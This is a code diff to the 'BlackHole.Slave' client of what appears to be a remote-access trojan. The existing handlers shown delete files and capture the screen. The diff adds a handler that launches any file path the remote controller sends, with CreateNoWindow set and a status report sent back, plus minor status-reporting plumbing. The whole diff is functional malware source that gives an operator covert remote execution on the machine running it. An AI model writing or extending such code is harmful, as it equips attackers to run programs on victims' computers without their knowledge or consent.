@@ -158,6 +158,7 @@ namespace BlackHole.Slave
                 .With<DeleteFileMessage>(DeleteFile)
                 .With<StartScreenCaptureMessage>(StartScreenCapture)
                 .With<StopScreenCaptureMessage>(StopScreenCapture)
+                .With<ExecuteFileMessage>(ExecuteFile)
                 .Default(m =>
                 {
                     SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}");
@@ -227,7 +228,30 @@ namespace BlackHole.Slave
         {
             Send(new PongMessage());
         }
-           
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="windowId"></param>
+        /// <param name="operationName"></param>
+        /// <param name="operation"></param>
+        /// <param name="message"></param>
+        private void ExecuteSimpleOperation(int windowId, long operationId, string operationName, Action operation, string sucessMessage) =>
+            Utility.ExecuteComplexOperation(() =>
+            {
+                operation();
+                return true;
+            },
+            (result) =>
+            {
+                SendStatus(windowId, operationId, operationName, "Success : " + sucessMessage);
+            },
+            (error) =>
+            {
+                SendStatus(windowId, operationId, operationName, error);
+            });
+
+
         /// <summary>
         /// 
         /// </summary>
@@ -236,7 +260,7 @@ namespace BlackHole.Slave
         /// <param name="operation"></param>
         /// <param name="messageBuilder"></param>
         private void ExecuteSimpleOperation<T>(int windowId, string operationName, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
-            => ExecuteComplexSendOperation(-1, operationName, operation, (message) =>
+            => ExecuteComplexSendOperation(windowId, operationName, operation, (message) =>
             {
                 SendStatus(windowId, -1, operationName, "Success : " + messageBuilder(message));
             });
@@ -413,6 +437,25 @@ namespace BlackHole.Slave
         private void StopScreenCapture(StopScreenCaptureMessage message)
         {
             m_screenCaptureTokenSource.Cancel();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="message"></param>
+        private void ExecuteFile(ExecuteFileMessage message)
+        {
+            ExecuteSimpleOperation(message.WindowId, -1, "File execution",
+                () =>
+                {
+                    var startInfo = new ProcessStartInfo()
+                    {
+                        UseShellExecute = true,
+                        FileName = message.FilePath,
+                        CreateNoWindow = true,
+                    };
+                    Process.Start(startInfo);
+                }, message.FilePath);
         }
     }
 }
